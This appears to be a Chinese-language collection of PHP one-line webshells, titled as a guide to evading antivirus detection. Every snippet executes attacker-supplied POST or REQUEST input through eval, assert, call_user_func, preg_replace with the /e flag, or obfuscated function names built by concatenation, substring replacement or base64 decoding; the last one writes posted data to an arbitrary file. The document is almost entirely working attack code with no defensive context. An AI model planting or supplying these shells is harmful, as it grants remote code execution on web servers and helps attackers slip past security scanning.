
一句话木马免杀
===

```php
<?php
eval($_POST['haha']);
?>
```

```php
<?php
assert($_POST['haha']);
?>
```

```php
<?php
@call_user_func(assert,$_POST['haha']);
?>
```

```php
<?php
$a = substr_replace("assexx","rt",4);
$a($_POST['haha']);
?>
```

```php
<?php
function fun1($a){
    $a($_POST['haha']);
}
fun1(assert);
?>
```

```php
<?php

function fun1($a){
    assert($a);
}

fun1($_POST['haha']);

?>
```

```php
<?php

$a = $_REQUEST['haha'];
$b = "\n";
eval($b.=$a);

?>
```

```php
<?php

class me{
    public $a = '';
    function __destruct()
    { 
        assert("$this->a");
    }
}

$obj = new me;
$obj->a = $_POST['haha'];

?>
```

```php
<?php

$a = base64_decode("YXNzZXJ0");

$a($_POST['haha']);

?>
```

```php
<?php

$a = "a"."s";
$b = "e"."r"."t";

$c = $a.$b;

$c($_POST['haha']);

?>
```

```php
<?php

function fun(){
    return $_POST['haha'];
}

@preg_replace("/nihao/e",fun(),"nihao woshi zj");

?>
```

```php
<?php

if(isset($_POST['file'])){
    $d = 'data';
    $$d = $_POST['haha'];//$data
    $f = 'fp';
    $$f = fopen($_POST['file'],'wb');//$fp
    echo fwrite($fp,$data)?'save success':'save fail';
    fclose($fp);
}

?>
```
